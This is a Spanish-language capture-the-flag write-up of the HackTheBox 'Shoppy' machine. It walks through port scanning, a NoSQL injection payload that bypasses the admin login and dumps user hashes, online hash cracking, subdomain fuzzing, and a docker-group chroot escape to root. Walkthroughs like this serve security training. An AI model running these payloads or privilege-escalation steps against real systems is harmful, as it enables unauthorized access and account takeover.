# Máquina "Shoppy" de HackTheBox

## Características

- Linux
- Fácil
- Virtual Hosting
- Subdomain enumeration 
- NoSQL Injection (Admin Auth Bypass)
- Abusing The Shoppy App search engine (NoSQL injection) Obtaining the password of DB users
- Cracking hashes online
- Login to Mattermost + Information Leakage
- Abusing Sudoers privilege
- Binary Analysis - GHIDRA [reverse engineering] 
- Abusing Docker Group [privilege escalation]

## Útil en

- eWPT
- OSWE
- OSCP

**IP:** 10.10.11.180

## Escaneo de puertos

```bash
nmap -p- --min-rate 10000 10.10.11.180
```

```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9093/tcp open  copycat
```

```bash
nmap -p 22,80,9093 -sCV 10.10.11.180
```

```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp   open  http     nginx 1.23.1
|_http-server-header: nginx/1.23.1
|_http-title: Did not follow redirect to http://shoppy.htb
9093/tcp open  copycat?
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: text/plain; version=0.0.4; charset=utf-8
|     Date: Tue, 10 Jan 2023 21:41:55 GMT
|     HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime.
|     TYPE go_gc_cycles_automatic_gc_cycles_total counter
|     go_gc_cycles_automatic_gc_cycles_total 4
|     HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application.
|     TYPE go_gc_cycles_forced_gc_cycles_total counter
|     go_gc_cycles_forced_gc_cycles_total 0
|     HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles.
|     TYPE go_gc_cycles_total_gc_cycles_total counter
|     go_gc_cycles_total_gc_cycles_total 4
|     HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.
|     TYPE go_gc_duration_seconds summary
|     go_gc_duration_seconds{quantile="0"} 4.8561e-05
|     go_gc_duration_seconds{quantile="0.25"} 8.7123e-05
|_    go_gc_dur
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Reconocimiento Web

Solo hay dos puertos abiertos. Cuando intentamos acceder a la página web no se muestra, así que la agregaremos al `/etc/hosts`. Una vez hecho esto, vemos:

![Web Principal](/secciones/posts/imagenes/shoppy/web1.webp)

Verifiqué el código fuente y con Burp Suite inspeccioné los encabezados y las solicitudes. Recibimos un mensaje de error: vaya a `shoppy.htb/hello`. Esto devuelve el mensaje de error "No se puede OBTENER /hello". Esto es cosa de Node.js, básicamente se trata de JavaScript en segundo plano.

Después de eso, intenté hacer lo mismo y traté de ir a `/login` y encontré la página de inicio de sesión del administrador.

## Explotación - NoSQL Injection

Primero, intenté inyectar esta carga útil para la contraseña y no funcionó:

```
'+o'1'='1 — -
```

Cambiar el tipo de contenido a `application/json` no funcionó, la inyección al nombre de usuario tampoco funcionó. Mi objetivo es devolver el mensaje de error o recibir una respuesta interesante. Después de eso, eliminé el parámetro de contraseña y devolvió mensajes de error JSON.

![Burp Request](/secciones/posts/imagenes/shoppy/burp1.webp)

Intentaremos con una consulta NoSQL:

```
Username=admin'||'1'=='1
Password=123123
```

Esta carga útil funciona y nos redirige a la página de administración.

Usé la función "buscar usuario" y busqué "admin", devuelve el archivo y cuando lo descargué, en el archivo existen valores de username, password e ID.

Busqué nuevamente con `admin'||'1'=='1` y esto nos da todos los usuarios que tenemos: admin y josh. Podemos intentar descifrar los hashes de contraseñas.

Primero guardé los hashes en un archivo txt.

## Cracking de Hashes

https://crackstation.net devolvió el formato y el valor de los hashes. No encontró el hash de admin, pero devolvió el formato de hash MD5 y el valor de contraseña de Josh.

Nmap había encontrado dos puertos abiertos, uno de ellos es SSH. Intenté conectar por SSH usando el resultado del hash, pero no tuvimos resultados.

## Enumeración de Subdominios

Vamos a buscar subdominios:

```bash
ffuf -u http://shoppy.htb -H "Host: FUZZ.shoppy.htb" -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquerk-subdomains-top100000.txt -fw 5
```

Encontramos "mattermost", agregamos esto al archivo `/etc/hosts`. Nos devuelve una página en la que iniciaremos correctamente desde josh.

![Josh Login](/secciones/posts/imagenes/shoppy/josh1.webp)

Dentro encontraremos unas credenciales con las que sí podremos iniciar por SSH.

## Escalada de Privilegios

```bash
ls -la /home/deploy
```

Devuelve muchos archivos, algunos de ellos interesantes. Intenté abrirlos todos uno por uno para obtener información útil.

Tenemos acceso denegado a muchos comandos desde este usuario. Podemos ver la ruta `/home/deploy/password-manager` que es un administrador de contraseñas.

```bash
strings -el /home/deploy/password-manager
```

Con los siguientes comandos intenté abrir Sample:

```bash
sudo -u deploy /home/deploy/password-manager
```

**Password:** Sample

Y tenemos nuevas credenciales con las que intentaremos conectar por SSH y accedemos como deploy. Hacemos `id` para obtener que somos parte del grupo docker.

## Explotación del Grupo Docker

Lanzamos:

```bash
docker run --rm -it -v /:/mnt alpine /bin/sh
```

Después de este comando lo haremos en el container:

- Parámetro `--rm` = eliminar el contenedor cuando esté listo
- Parámetro `-it` = terminal interactivo  
- Parámetro `-v` = para el punto de montaje

Una vez dentro hacemos:

```bash
cd /mnt
chroot . /bin/bash
```

Luego de esto encontramos la flag de root.

---

**Nota:** Algunos de los writeups en esta página pueden tener contenido de otras páginas o tener muy pocas imágenes, esto debido a que en algunas de las máquinas que realicé, no tomé los apuntes o no tomé capturas de pantalla, así que he decidido buscar varios writeups y agregar lo que esté mejor explicado en cada uno para plasmarlo aquí. También si encuentras faltas de ortografía o cualquier error, puedes contactarme a mi correo.